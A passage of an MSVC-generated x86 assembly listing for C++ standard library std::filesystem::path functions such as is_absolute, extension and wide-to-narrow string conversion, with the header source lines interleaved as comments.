  00021	50		 push	 eax
  00022	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00025	e8 00 00 00 00	 call	 ??_0path@filesystem@std@@QAEAAV012@ABV012@@Z ; std::filesystem::path::operator/=
  0002a	89 45 dc	 mov	 DWORD PTR $T1[ebp], eax
  0002d	8d 4d e4	 lea	 ecx, DWORD PTR $T2[ebp]
  00030	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
  00035	8b 45 dc	 mov	 eax, DWORD PTR $T1[ebp]

; 781  :         }

  00038	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0003b	33 cd		 xor	 ecx, ebp
  0003d	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00042	8b e5		 mov	 esp, ebp
  00044	5d		 pop	 ebp
  00045	c2 04 00	 ret	 4
??$?_0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAEAAV012@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@@Z ENDP ; std::filesystem::path::operator/=<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@AAPB_W@std@@YAAAPB_WAAPB_W@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@AAPB_W@std@@YAAAPB_WAAPB_W@Z PROC		; std::forward<wchar_t const * &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@AAPB_W@std@@YAAAPB_WAAPB_W@Z ENDP		; std::forward<wchar_t const * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@W4format@012@@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Source$ = 8						; size = 4
___formal$ = 12						; size = 4
??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@W4format@012@@Z PROC ; std::filesystem::path::path<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>, COMDAT
; _this$ = ecx

; 655  :         path(const _Src& _Source, format = auto_format) : _Text(_Convert_Source_to_wide(_Source)) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	33 c0		 xor	 eax, eax
  0000b	88 45 ff	 mov	 BYTE PTR $T1[ebp], al
  0000e	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T1[ebp]
  00012	51		 push	 ecx
  00013	8b 55 08	 mov	 edx, DWORD PTR __Source$[ebp]
  00016	52		 push	 edx
  00017	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	50		 push	 eax
  0001b	e8 00 00 00 00	 call	 ??$_Convert_Source_to_wide@V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@U_Normal_conversion@filesystem@2@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z ; std::filesystem::_Convert_Source_to_wide<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,std::filesystem::_Normal_conversion>
  00020	83 c4 0c	 add	 esp, 12			; 0000000cH

; 656  :             // format has no meaning for this implementation, as the generic grammar is acceptable as a native path
; 657  :         }

  00023	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c2 08 00	 ret	 8
??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@W4format@012@@Z ENDP ; std::filesystem::path::path<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\chrono
;	COMDAT ??$_Convert_wide_to_narrow@U?$char_traits@D@std@@V?$allocator@D@2@@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@0@ABV?$allocator@D@0@@Z
_TEXT	SEGMENT
$T1 = -68						; size = 8
$T2 = -60						; size = 8
tv141 = -52						; size = 4
tv143 = -48						; size = 4
__Data_as_char$3 = -44					; size = 4
tv88 = -40						; size = 4
tv90 = -36						; size = 4
__Len$4 = -32						; size = 4
__Output$ = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
___$ReturnUdt$ = 8					; size = 4
__Code_page$ = 12					; size = 4
__Input$ = 16						; size = 8
__Al$ = 24						; size = 4
??$_Convert_wide_to_narrow@U?$char_traits@D@std@@V?$allocator@D@2@@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@0@ABV?$allocator@D@0@@Z PROC ; std::_Convert_wide_to_narrow<std::char_traits<char>,std::allocator<char> >, COMDAT

; 60   :     const __std_code_page _Code_page, const wstring_view _Input, const _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax

; 61   :     basic_string<typename _Traits::char_type, _Traits, _Alloc> _Output(_Al);

  00010	8b 45 18	 mov	 eax, DWORD PTR __Al$[ebp]
  00013	50		 push	 eax
  00014	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  00017	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV?$allocator@D@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >

; 62   : 
; 63   :     if (!_Input.empty()) {

  0001c	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  0001f	e8 00 00 00 00	 call	 ?empty@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBE_NXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::empty
  00024	0f b6 c8	 movzx	 ecx, al
  00027	85 c9		 test	 ecx, ecx
  00029	0f 85 b8 00 00
	00		 jne	 $LN2@Convert_wi

; 64   :         if (_Input.size() > static_cast<size_t>(INT_MAX)) {

  0002f	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  00032	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  00037	3d ff ff ff 7f	 cmp	 eax, 2147483647		; 7fffffffH
  0003c	76 07		 jbe	 SHORT $LN3@Convert_wi

; 65   :             _Throw_system_error(errc::invalid_argument);

  0003e	6a 16		 push	 22			; 00000016H
  00040	e8 00 00 00 00	 call	 ?_Throw_system_error@std@@YAXW4errc@1@@Z ; std::_Throw_system_error
$LN3@Convert_wi:

; 66   :         }
; 67   : 
; 68   :         const int _Len = _Check_convert_result(

  00045	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  00048	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  0004d	89 45 dc	 mov	 DWORD PTR tv90[ebp], eax
  00050	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  00053	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  00058	89 45 d8	 mov	 DWORD PTR tv88[ebp], eax
  0005b	6a 00		 push	 0
  0005d	6a 00		 push	 0
  0005f	8b 55 dc	 mov	 edx, DWORD PTR tv90[ebp]
  00062	52		 push	 edx
  00063	8b 45 d8	 mov	 eax, DWORD PTR tv88[ebp]
  00066	50		 push	 eax
  00067	8b 4d 0c	 mov	 ecx, DWORD PTR __Code_page$[ebp]
  0006a	51		 push	 ecx
  0006b	e8 00 00 00 00	 call	 ___std_fs_convert_wide_to_narrow@20
  00070	89 45 c4	 mov	 DWORD PTR $T2[ebp], eax
  00073	89 55 c8	 mov	 DWORD PTR $T2[ebp+4], edx
  00076	8b 55 c8	 mov	 edx, DWORD PTR $T2[ebp+4]
  00079	52		 push	 edx
  0007a	8b 45 c4	 mov	 eax, DWORD PTR $T2[ebp]
  0007d	50		 push	 eax
  0007e	e8 00 00 00 00	 call	 ?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ; std::_Check_convert_result
  00083	83 c4 08	 add	 esp, 8
  00086	89 45 e0	 mov	 DWORD PTR __Len$4[ebp], eax

; 69   :             __std_fs_convert_wide_to_narrow(_Code_page, _Input.data(), static_cast<int>(_Input.size()), nullptr, 0));
; 70   : 
; 71   :         _Output.resize(static_cast<size_t>(_Len));

  00089	6a 00		 push	 0
  0008b	8b 4d e0	 mov	 ecx, DWORD PTR __Len$4[ebp]
  0008e	51		 push	 ecx
  0008f	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  00092	e8 00 00 00 00	 call	 ?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXID@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize

; 72   : 
; 73   :         const auto _Data_as_char = reinterpret_cast<char*>(_Output.data());

  00097	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  0009a	e8 00 00 00 00	 call	 ?data@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEPADXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::data
  0009f	89 45 d4	 mov	 DWORD PTR __Data_as_char$3[ebp], eax

; 74   : 
; 75   :         (void) _Check_convert_result(__std_fs_convert_wide_to_narrow(

  000a2	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  000a5	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  000aa	89 45 d0	 mov	 DWORD PTR tv143[ebp], eax
  000ad	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  000b0	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  000b5	89 45 cc	 mov	 DWORD PTR tv141[ebp], eax
  000b8	8b 55 e0	 mov	 edx, DWORD PTR __Len$4[ebp]
  000bb	52		 push	 edx
  000bc	8b 45 d4	 mov	 eax, DWORD PTR __Data_as_char$3[ebp]
  000bf	50		 push	 eax
  000c0	8b 4d d0	 mov	 ecx, DWORD PTR tv143[ebp]
  000c3	51		 push	 ecx
  000c4	8b 55 cc	 mov	 edx, DWORD PTR tv141[ebp]
  000c7	52		 push	 edx
  000c8	8b 45 0c	 mov	 eax, DWORD PTR __Code_page$[ebp]
  000cb	50		 push	 eax
  000cc	e8 00 00 00 00	 call	 ___std_fs_convert_wide_to_narrow@20
  000d1	89 45 bc	 mov	 DWORD PTR $T1[ebp], eax
  000d4	89 55 c0	 mov	 DWORD PTR $T1[ebp+4], edx
  000d7	8b 4d c0	 mov	 ecx, DWORD PTR $T1[ebp+4]
  000da	51		 push	 ecx
  000db	8b 55 bc	 mov	 edx, DWORD PTR $T1[ebp]
  000de	52		 push	 edx
  000df	e8 00 00 00 00	 call	 ?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ; std::_Check_convert_result
  000e4	83 c4 08	 add	 esp, 8
$LN2@Convert_wi:

; 76   :             _Code_page, _Input.data(), static_cast<int>(_Input.size()), _Data_as_char, _Len));
; 77   :     }
; 78   : 
; 79   :     return _Output;

  000e7	8d 45 e4	 lea	 eax, DWORD PTR __Output$[ebp]
  000ea	50		 push	 eax
  000eb	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  000ee	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  000f3	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  000f6	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  000fb	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
$LN1@Convert_wi:

; 80   : }

  000fe	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00101	33 cd		 xor	 ecx, ebp
  00103	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00108	8b e5		 mov	 esp, ebp
  0010a	5d		 pop	 ebp
  0010b	c3		 ret	 0
??$_Convert_wide_to_narrow@U?$char_traits@D@std@@V?$allocator@D@2@@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@0@ABV?$allocator@D@0@@Z ENDP ; std::_Convert_wide_to_narrow<std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$string@DU?$char_traits@D@std@@V?$allocator@D@2@$0A@@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABV?$allocator@D@2@@Z
_TEXT	SEGMENT
$T1 = -16						; size = 8
tv71 = -8						; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Al$ = 12						; size = 4
??$string@DU?$char_traits@D@std@@V?$allocator@D@2@$0A@@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABV?$allocator@D@2@@Z PROC ; std::filesystem::path::string<char,std::char_traits<char>,std::allocator<char>,0>, COMDAT
; _this$ = ecx

; 934  :         _NODISCARD basic_string<_EcharT, _Traits, _Alloc> string(const _Alloc& _Al = _Alloc()) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 935  :             // convert the native path from this instance into a basic_string
; 936  :             return _Convert_wide_to<_Traits>(_Text, _Al);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv71[ebp], eax
  0000f	8b 4d 0c	 mov	 ecx, DWORD PTR __Al$[ebp]
  00012	51		 push	 ecx
  00013	8d 55 f0	 lea	 edx, DWORD PTR $T1[ebp]
  00016	52		 push	 edx
  00017	8b 4d f8	 mov	 ecx, DWORD PTR tv71[ebp]
  0001a	e8 00 00 00 00	 call	 ??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  0001f	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  00022	51		 push	 ecx
  00023	8b 10		 mov	 edx, DWORD PTR [eax]
  00025	52		 push	 edx
  00026	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00029	50		 push	 eax
  0002a	e8 00 00 00 00	 call	 ??$_Convert_wide_to@U?$char_traits@D@std@@V?$allocator@D@2@D@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z ; std::filesystem::_Convert_wide_to<std::char_traits<char>,std::allocator<char>,char>
  0002f	83 c4 10	 add	 esp, 16			; 00000010H
  00032	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 937  :         }

  00035	8b e5		 mov	 esp, ebp
  00037	5d		 pop	 ebp
  00038	c2 08 00	 ret	 8
??$string@DU?$char_traits@D@std@@V?$allocator@D@2@$0A@@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABV?$allocator@D@2@@Z ENDP ; std::filesystem::path::string<char,std::char_traits<char>,std::allocator<char>,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??8filesystem@std@@YA_NABVpath@01@0@Z
_TEXT	SEGMENT
tv69 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??8filesystem@std@@YA_NABVpath@01@0@Z PROC		; std::filesystem::operator==, COMDAT

; 1349 :         _NODISCARD_FRIEND bool operator==(const path& _Left, const path& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 1350 :             return _Left.compare(_Right._Text) == 0;

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Right$[ebp]
  00007	50		 push	 eax
  00008	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000b	e8 00 00 00 00	 call	 ?compare@path@filesystem@std@@QBEHABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@@Z ; std::filesystem::path::compare
  00010	85 c0		 test	 eax, eax
  00012	75 09		 jne	 SHORT $LN3@operator
  00014	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv69[ebp], 1
  0001b	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  0001d	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv69[ebp], 0
$LN4@operator:
  00024	0f b6 45 fc	 movzx	 eax, BYTE PTR tv69[ebp]

; 1351 :         }

  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c3		 ret	 0
??8filesystem@std@@YA_NABVpath@01@0@Z ENDP		; std::filesystem::operator==
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?is_absolute@path@filesystem@std@@QBE_NXZ
_TEXT	SEGMENT
tv93 = -20						; size = 4
tv87 = -16						; size = 4
_this$ = -12						; size = 4
__Last$ = -8						; size = 4
__First$ = -4						; size = 4
?is_absolute@path@filesystem@std@@QBE_NXZ PROC		; std::filesystem::path::is_absolute, COMDAT
; _this$ = ecx

; 1172 :         _NODISCARD bool is_absolute() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 1173 :             // paths with a root-name that is a drive letter and no root-directory are drive relative, such as x:example
; 1174 :             // paths with no root-name or root-directory are relative, such as example
; 1175 :             // paths with no root-name but a root-directory are root relative, such as \example
; 1176 :             // all other paths are absolute
; 1177 :             const auto _First = _Text.data();

  00009	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
  00011	89 45 fc	 mov	 DWORD PTR __First$[ebp], eax

; 1178 :             const auto _Last  = _First + _Text.size();

  00014	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR __First$[ebp]
  0001f	8d 14 41	 lea	 edx, DWORD PTR [ecx+eax*2]
  00022	89 55 f8	 mov	 DWORD PTR __Last$[ebp], edx

; 1179 :             if (_Has_drive_letter_prefix(_First, _Last)) { // test for X:\ but not X:cat

  00025	8b 45 f8	 mov	 eax, DWORD PTR __Last$[ebp]
  00028	50		 push	 eax
  00029	8b 4d fc	 mov	 ecx, DWORD PTR __First$[ebp]
  0002c	51		 push	 ecx
  0002d	e8 00 00 00 00	 call	 ?_Has_drive_letter_prefix@filesystem@std@@YA_NQB_W0@Z ; std::filesystem::_Has_drive_letter_prefix
  00032	83 c4 08	 add	 esp, 8
  00035	0f b6 d0	 movzx	 edx, al
  00038	85 d2		 test	 edx, edx
  0003a	74 42		 je	 SHORT $LN2@is_absolut

; 1180 :                 return _Last - _First >= 3 && _Is_slash(_First[2]);

  0003c	8b 45 f8	 mov	 eax, DWORD PTR __Last$[ebp]
  0003f	2b 45 fc	 sub	 eax, DWORD PTR __First$[ebp]
  00042	d1 f8		 sar	 eax, 1
  00044	83 f8 03	 cmp	 eax, 3
  00047	7c 29		 jl	 SHORT $LN4@is_absolut
  00049	b9 02 00 00 00	 mov	 ecx, 2
  0004e	d1 e1		 shl	 ecx, 1
  00050	8b 55 fc	 mov	 edx, DWORD PTR __First$[ebp]
  00053	0f b7 04 0a	 movzx	 eax, WORD PTR [edx+ecx]
  00057	50		 push	 eax
  00058	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  0005d	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00062	0f b6 c8	 movzx	 ecx, al
  00065	85 c9		 test	 ecx, ecx
  00067	74 09		 je	 SHORT $LN4@is_absolut
  00069	c7 45 f0 01 00
	00 00		 mov	 DWORD PTR tv87[ebp], 1
  00070	eb 07		 jmp	 SHORT $LN5@is_absolut
$LN4@is_absolut:
  00072	c7 45 f0 00 00
	00 00		 mov	 DWORD PTR tv87[ebp], 0
$LN5@is_absolut:
  00079	8a 45 f0	 mov	 al, BYTE PTR tv87[ebp]
  0007c	eb 28		 jmp	 SHORT $LN1@is_absolut
$LN2@is_absolut:

; 1181 :             }
; 1182 : 
; 1183 :             // if root-name is otherwise nonempty, then it must be one of the always-absolute prefixes like
; 1184 :             // \\?\ or \\server, so the path is absolute. Otherwise it is relative.
; 1185 :             return _First != _Find_root_name_end(_First, _Last);

  0007e	8b 55 f8	 mov	 edx, DWORD PTR __Last$[ebp]
  00081	52		 push	 edx
  00082	8b 45 fc	 mov	 eax, DWORD PTR __First$[ebp]
  00085	50		 push	 eax
  00086	e8 00 00 00 00	 call	 ?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_root_name_end
  0008b	83 c4 08	 add	 esp, 8
  0008e	39 45 fc	 cmp	 DWORD PTR __First$[ebp], eax
  00091	74 09		 je	 SHORT $LN6@is_absolut
  00093	c7 45 ec 01 00
	00 00		 mov	 DWORD PTR tv93[ebp], 1
  0009a	eb 07		 jmp	 SHORT $LN7@is_absolut
$LN6@is_absolut:
  0009c	c7 45 ec 00 00
	00 00		 mov	 DWORD PTR tv93[ebp], 0
$LN7@is_absolut:
  000a3	8a 45 ec	 mov	 al, BYTE PTR tv93[ebp]
$LN1@is_absolut:

; 1186 :         }

  000a6	8b e5		 mov	 esp, ebp
  000a8	5d		 pop	 ebp
  000a9	c3		 ret	 0
?is_absolute@path@filesystem@std@@QBE_NXZ ENDP		; std::filesystem::path::is_absolute
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?extension@path@filesystem@std@@QBE?AV123@XZ
_TEXT	SEGMENT
$T1 = -24						; size = 8
$T2 = -16						; size = 8
tv73 = -8						; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
?extension@path@filesystem@std@@QBE?AV123@XZ PROC	; std::filesystem::path::extension, COMDAT
; _this$ = ecx

; 1123 :         _NODISCARD path extension() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1124 :             // parse the extension from *this and return a copy if present; otherwise, return the empty path
; 1125 :             return _Parse_extension(_Text);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv73[ebp], eax
  0000f	6a 00		 push	 0
  00011	8d 4d f0	 lea	 ecx, DWORD PTR $T2[ebp]
  00014	51		 push	 ecx
  00015	8b 4d f8	 mov	 ecx, DWORD PTR tv73[ebp]
  00018	e8 00 00 00 00	 call	 ??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  0001d	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00020	52		 push	 edx
  00021	8b 00		 mov	 eax, DWORD PTR [eax]
  00023	50		 push	 eax
  00024	8d 4d e8	 lea	 ecx, DWORD PTR $T1[ebp]
  00027	51		 push	 ecx
  00028	e8 00 00 00 00	 call	 ?_Parse_extension@filesystem@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@2@V32@@Z ; std::filesystem::_Parse_extension
  0002d	83 c4 0c	 add	 esp, 12			; 0000000cH
  00030	50		 push	 eax
  00031	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00034	e8 00 00 00 00	 call	 ??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@W4format@012@@Z ; std::filesystem::path::path<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
  00039	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 1126 :         }

  0003c	8b e5		 mov	 esp, ebp
  0003e	5d		 pop	 ebp
  0003f	c2 04 00	 ret	 4
?extension@path@filesystem@std@@QBE?AV123@XZ ENDP	; std::filesystem::path::extension
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?compare@path@filesystem@std@@QBEHV?$basic_string_view@_WU?$char_traits@_W@std@@@3@@Z
_TEXT	SEGMENT
__Cmp$1 = -68						; size = 4
__Slash_cmp$2 = -64					; size = 4
__Empty_cmp$3 = -60					; size = 4
__Root_name_cmp$ = -56					; size = 4
__Root_cmp$ = -52					; size = 4
_this$ = -48						; size = 4
__Other_root_name_end$ = -44				; size = 4
__My_root_name_end$ = -40				; size = 4
__My_first$ = -36					; size = 4
__Other_first$ = -32					; size = 4
__Other_last$ = -28					; size = 4
__My_last$ = -24					; size = 4
__Other_relative$ = -20					; size = 4
__My_relative$ = -16					; size = 4
__Other_slash$4 = -10					; size = 1
__Other_empty$5 = -9					; size = 1
__Other_has_root_name$ = -8				; size = 1
__My_has_root_name$ = -7				; size = 1
__My_slash$6 = -6					; size = 1
__My_empty$7 = -5					; size = 1
tv141 = -4						; size = 1
tv139 = -3						; size = 1
tv133 = -2						; size = 1
tv131 = -1						; size = 1
__Other$ = 8						; size = 8
?compare@path@filesystem@std@@QBEHV?$basic_string_view@_WU?$char_traits@_W@std@@@3@@Z PROC ; std::filesystem::path::compare, COMDAT
; _this$ = ecx

; 1024 :         _NODISCARD int compare(const basic_string_view<value_type> _Other) const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	89 4d d0	 mov	 DWORD PTR _this$[ebp], ecx

; 1025 :             // compare *this with _Other
; 1026 :             // several places herein quote the standard, but the standard's variable p is replaced with _Other
; 1027 :             const auto _My_first            = _Text.data();

  00009	8b 4d d0	 mov	 ecx, DWORD PTR _this$[ebp]
